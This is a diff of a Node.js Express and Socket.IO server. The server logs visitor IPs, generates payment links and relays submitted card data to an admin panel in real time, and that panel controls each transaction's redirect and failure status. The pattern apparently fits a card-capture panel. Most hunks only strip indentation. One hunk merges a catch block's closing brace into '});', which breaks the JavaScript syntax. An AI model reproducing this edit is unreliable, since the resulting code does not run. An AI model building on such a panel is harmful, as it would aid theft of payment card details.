@@ -165,7 +165,6 @@ app.use((req, res, next) => {
                req.connection.remoteAddress || 
                req.socket.remoteAddress || 
                'Unknown';
-    
     const timestamp = new Date().toLocaleString();
     const lastActive = Date.now();
     const userAgent = req.headers['user-agent'] || 'Unknown';
@@ -358,7 +357,7 @@ app.post('/api/visitor-heartbeat', (req, res) => {
     const visitor = visitors.get(pid);
     visitor.lastActive = Date.now();
     visitors.set(pid, visitor);
-    return res.json({ success: true });
+return res.json({ success: true });
   }
   
   res.status(400).json({ success: false });
@@ -489,8 +488,7 @@ app.post('/api/generatePaymentLink', (req, res) => {
   } catch (error) {
     console.error('Payment Link Error:', error);
     res.status(500).json({ status: "error", message: "Internal server error" });
-  }
-});
+  });
 
 // Free Payment Links Endpoint
 app.post('/api/generateFreeLink', (req, res) => {
@@ -655,7 +653,7 @@ app.post('/api/sendPaymentDetails', (req, res) => {
     // Emit both events for compatibility
     io.emit('new_transaction');
     
-    // Add card_submitted event with transaction data for real-time updates in admin panel
+// Add card_submitted event with transaction data for real-time updates in admin panel
     io.emit('card_submitted', {
       invoiceId,
       cardData: {
@@ -784,7 +782,7 @@ app.post('/api/updateRedirectStatus', (req, res) => {
   const txn = transactions.get(invoiceId);
   if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
 
-  txn.redirectStatus = redirectStatus;
+txn.redirectStatus = redirectStatus;
   if (failureReason) {
     txn.failureReason = failureReason;
   }
@@ -914,7 +912,7 @@ const server = app.listen(PORT, () => {
   console.log(`__dirname: ${__dirname}`);
   console.log(`Redirect file: ${PAYMENT_REDIRECT_FILE}`);
   
-  // List files in the current directory to verify what's available
+// List files in the current directory to verify what's available
   try {
     const files = fs.readdirSync(process.cwd());
     console.log('Files in working directory:', files);
@@ -1048,7 +1046,7 @@ io.on('connection', (socket) => {
       };
     }
     
-    // Store transaction
+// Store transaction
     transactions.set(data.invoiceId, transaction);
     
     // Acknowledge receipt back to the client
@@ -1222,6 +1220,7 @@ socket.on('process_payment', (paymentData) => {
     }
   }, 2000); // Simulate processing delay
 });
+
   // Add listener for currency page redirection
   socket.on('currency_redirect', (data) => {
     console.log('Received currency_redirect event:', data);
@@ -1755,7 +1754,6 @@ case 'verification_failed':
     console.log('Socket disconnected:', socket.id);
   });
 });
-
 // ======= MC VERIFICATION HELPER FUNCTIONS =======
 
 // Detects card type based on card number
